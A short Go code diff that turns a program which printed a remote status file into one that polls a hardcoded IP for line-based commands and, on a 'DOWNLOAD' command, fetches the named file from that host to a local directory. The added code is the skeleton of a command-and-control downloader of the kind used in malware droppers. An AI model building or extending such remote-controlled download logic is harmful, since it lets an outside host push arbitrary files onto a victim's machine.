@@ -8,17 +8,28 @@ import (
 	"math/rand"
 	"net/http"
 	"os"
+	"strings"
 	"time"
 )
 
-var host string = "http://192.168.12.6/stat.txt"
+var downDir string = "./"
+var host string = "http://192.168.12.6/"
 
 func main() {
 	do()
 }
 
 func do() {
-	fmt.Println(getHTTP(host))
+	stat := getHTTP(host + "stat")
+	commands := strings.Split(stat, "\n")
+	for i := 0; i < len(commands); i++ {
+		command := commands[i]
+		switch command {
+		case "DOWNLOAD":
+			downloadFile(downDir, host+commands[i+1])
+		}
+
+	}
 	//repeat()
 }
 
